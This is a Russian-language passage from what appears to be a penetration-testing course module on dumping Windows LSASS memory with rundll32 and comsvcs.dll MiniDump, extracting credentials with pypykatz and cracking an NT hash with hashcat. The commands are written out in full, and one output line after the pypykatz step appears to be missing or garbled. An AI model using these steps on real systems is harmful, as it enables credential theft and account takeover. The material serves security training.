#### Поиск PID LSASS в PowerShell

Из PowerShell мы можем ввести команду `Get-Process lsass`и увидеть идентификатор процесса в `Id` поле.
```powershell-session
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```
Получив PID, назначенный процессу LSASS, мы можем создать файл дампа.

#### Создание lsass.dmp с помощью PowerShell

В сеансе PowerShell с повышенными правами мы можем выполнить следующую команду для создания файла дампа:
```powershell-session
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

`Примечание. Мы можем использовать метод передачи файлов, описанный в разделе «Атака на SAM», чтобы получить файл lsass.dmp от цели к нашему атакующему хосту.`

## Использование Pypykatz для извлечения учетных данных
```shell-session
lizergindoma@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```
`Internet Explorer`

#### Взлом хэша NT с помощью Hashcat
```shell-session
lizergindoma@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

64f12cddaa88057e06a81b54e73b949b:Password1
```

